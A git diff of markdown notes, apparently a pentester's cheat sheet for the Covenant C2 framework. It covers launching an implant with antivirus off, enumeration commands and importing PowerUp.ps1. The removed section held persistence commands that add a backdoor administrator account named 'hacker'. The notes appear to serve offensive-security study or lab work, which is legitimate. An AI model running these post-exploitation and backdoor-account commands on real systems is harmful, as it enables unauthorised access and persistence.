@@ -14,7 +14,6 @@
 ## How to get a grunt
 
 * Make sure attacker's antivirus is turned off
-
 * Create a Listener
   * Be sure to change ConnectAddresses
 * Go into Launchers
@@ -27,7 +26,31 @@
 * Once ran, go into Grunts
 * Enjoy!
 
-## PowerUp.ps1
+## Enumeration with Covenant
+
+### Seatbelt
+
+```
+Seatbelt -group=all
+```
+
+### normal powershell
+
+```
+GetDomainUser
+```
+
+```
+GetNetLoggedOnUser
+```
+
+```
+GetNetLocalGroup
+```
+
+## Importing stuff into covenant
+
+### PowerUp.ps1
 
 ```
 PowershellImport
@@ -37,17 +60,5 @@ PowershellImport
 powershell i
 ```
 
-## Persistence
-
-Run these commands on a Grunt:
-
-```
-shellcmd net users hacker Password123! /add
-```
-
-```
-shell net localgroup administrators hacker /add
-```
-
-PersistStartup
+### ???
 
